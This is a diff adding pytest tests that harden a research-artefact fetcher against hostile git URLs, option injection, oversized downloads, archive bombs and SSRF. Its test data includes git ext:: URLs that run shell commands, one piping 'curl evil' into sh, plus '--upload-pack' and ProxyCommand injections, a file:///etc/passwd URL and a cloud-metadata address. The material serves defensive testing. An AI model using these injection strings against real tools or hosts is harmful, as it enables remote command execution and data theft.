@@ -298,3 +298,168 @@ def test_run_git_timeout(monkeypatch):
     monkeypatch.setattr(base.subprocess, "run", boom)
     with pytest.raises(FetchError, match="timed out after 600s"):
         run_git(["clone", "x"])
+
+
+# --- git clone hostile-input hardening (trust boundary: clone runs on host) ----
+
+import reprobe.fetch.git_host as git_host
+from reprobe.fetch.git_host import _reject_unsafe_clone_url, _reject_unsafe_ref
+
+
+@pytest.mark.parametrize("url", [
+    "ext::sh -c 'touch /tmp/pwned' #x.git",   # ext remote-helper -> host command execution
+    "ext::sh -c whoami x.git",
+    "fd::17/x.git",                            # fd transport
+    "-upload-pack=touch x.git",               # option-shaped ref
+    "--upload-pack=payload",
+    "file:///etc/passwd",                     # local exfiltration transport
+    "/local/path/x.git",                      # bare local path (not a fetchable URL)
+    "ssh -oProxyCommand=evil x.git",
+])
+def test_reject_unsafe_clone_url(url):
+    with pytest.raises(FetchError):
+        _reject_unsafe_clone_url(url)
+
+
+@pytest.mark.parametrize("url", [
+    "https://github.com/user/repo",
+    "http://gitlab.lrz.de/g/r.git",
+    "git://example.com/x.git",
+    "ssh://git@host/x.git",
+    "git@github.com:user/repo.git",
+])
+def test_accept_safe_clone_url(url):
+    _reject_unsafe_clone_url(url)   # must not raise
+
+
+@pytest.mark.parametrize("ref", ["--theirs", "-x", "--upload-pack=evil"])
+def test_reject_unsafe_checkout_ref(ref):
+    with pytest.raises(FetchError):
+        _reject_unsafe_ref(ref)
+
+
+def test_fetch_refuses_hostile_ref_before_clone(tmp_path, monkeypatch):
+    """A crafted `.git` ref that selects git's ext:: transport must be rejected
+    BEFORE run_git is ever called — no command may reach the host."""
+    called = []
+    monkeypatch.setattr(git_host, "run_git",
+                        lambda *a, **k: called.append(a) or pytest.fail("run_git must not run"))
+    for ref in ("ext::sh -c 'curl evil|sh' #x.git", "-upload-pack=x.git"):
+        # routing accepts it (ends in .git), but fetch must refuse it
+        assert GitHostFetcher().can_handle(ref)
+        with pytest.raises(FetchError):
+            GitHostFetcher().fetch(ref, tmp_path / "src")
+    assert called == []
+
+
+def test_clone_argv_uses_double_dash(tmp_path, monkeypatch):
+    """The clone argv must place `--` before the URL so a URL can never be
+    parsed as a git option."""
+    seen = {}
+
+    def fake_git(args, cwd=None, timeout=600):
+        seen.setdefault("argvs", []).append(list(args))
+        if args[0] == "rev-parse":
+            return subprocess.CompletedProcess(args, 0, stdout="deadbeef\n", stderr="")
+        if args[0] == "lfs":
+            return subprocess.CompletedProcess(args, 1, stdout="", stderr="")
+        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
+
+    monkeypatch.setattr(git_host, "run_git", fake_git)
+    GitHostFetcher().fetch("https://github.com/user/repo", tmp_path / "src")
+    clone_argv = seen["argvs"][0]
+    assert clone_argv[:3] == ["clone", "--quiet", "--"]
+    assert clone_argv[3] == "https://github.com/user/repo"
+
+
+def test_run_git_sets_protocol_allowlist(monkeypatch):
+    """run_git must whitelist only network transports (blocking ext::/fd::/file::)."""
+    captured = {}
+
+    def capture(argv, **kwargs):
+        captured["env"] = kwargs.get("env", {})
+        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")
+
+    monkeypatch.setattr(base.subprocess, "run", capture)
+    run_git(["rev-parse", "HEAD"])
+    allow = captured["env"].get("GIT_ALLOW_PROTOCOL", "")
+    assert allow and "ext" not in allow.split(":") and "file" not in allow.split(":")
+    assert "https" in allow.split(":")
+
+
+# --- download byte cap + archive-bomb guards (host DoS) ----------------------
+
+class _FakeResp:
+    def __init__(self, chunks, headers=None):
+        self._chunks = list(chunks)
+        self.headers = headers or {}
+    def __enter__(self): return self
+    def __exit__(self, *a): return False
+    def raise_for_status(self): pass
+    def iter_content(self, n): yield from self._chunks
+
+
+def _fake_session(resp):
+    class S:
+        def get(self, url, **k): return resp
+    return S()
+
+
+def test_download_streams_over_cap_aborts(tmp_path, monkeypatch):
+    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([b"x" * 50, b"y" * 50])))
+    ok, note = base.download("http://x/f", tmp_path / "f.bin", max_bytes=10)
+    assert not ok and "cap" in note.lower()
+    assert not (tmp_path / "f.bin").exists()          # partial file removed
+
+
+def test_download_content_length_cap(tmp_path, monkeypatch):
+    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([], headers={"Content-Length": "999"})))
+    ok, note = base.download("http://x/f", tmp_path / "f.bin", max_bytes=10)
+    assert not ok and "oversized" in note.lower()
+
+
+def test_download_under_cap_ok(tmp_path, monkeypatch):
+    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([b"hello"])))
+    ok, _ = base.download("http://x/f", tmp_path / "f.bin", max_bytes=1000)
+    assert ok and (tmp_path / "f.bin").read_bytes() == b"hello"
+
+
+def test_maybe_unzip_rejects_zip_bomb(tmp_path, monkeypatch):
+    import zipfile
+    monkeypatch.setattr(base, "_MAX_EXTRACT_BYTES", 10)
+    dest = tmp_path / "d"; dest.mkdir()
+    with zipfile.ZipFile(dest / "deposit.zip", "w") as z:
+        z.writestr("big.txt", b"x" * 100)
+    warnings = []
+    maybe_unzip(dest, warnings)
+    assert not (dest / "big.txt").exists()
+    assert any("bomb" in w or "cap" in w for w in warnings)
+
+
+def test_maybe_unzip_rejects_too_many_members(tmp_path, monkeypatch):
+    import zipfile
+    monkeypatch.setattr(base, "_MAX_ARCHIVE_MEMBERS", 1)
+    dest = tmp_path / "d"; dest.mkdir()
+    with zipfile.ZipFile(dest / "deposit.zip", "w") as z:
+        z.writestr("a.txt", b"a"); z.writestr("b.txt", b"b")
+    warnings = []
+    maybe_unzip(dest, warnings)
+    assert any("too many members" in w for w in warnings)
+
+
+def test_maybe_unzip_rejects_tar_bomb(tmp_path, monkeypatch):
+    monkeypatch.setattr(base, "_MAX_EXTRACT_BYTES", 2)   # _make_tar writes 4 bytes/file
+    dest = tmp_path / "d"; dest.mkdir()
+    _make_tar(dest / "deposit.tar.gz", ["big.txt"])
+    warnings = []
+    maybe_unzip(dest, warnings)
+    assert not (dest / "big.txt").exists()
+    assert any("bomb" in w or "cap" in w for w in warnings)
+
+
+def test_dataverse_rejects_ssrf_host():
+    f = DataverseFetcher()
+    # 'dataverse' only in the query, an internal host — must NOT be handled
+    assert not f.can_handle("http://169.254.169.254/dataset?persistentId=doi:10.1/x&note=dataverse")
+    # a real Dataverse host is still handled
+    assert f.can_handle("https://dataverse.harvard.edu/dataset.xhtml?persistentId=doi:10.7910/DVN/AB")
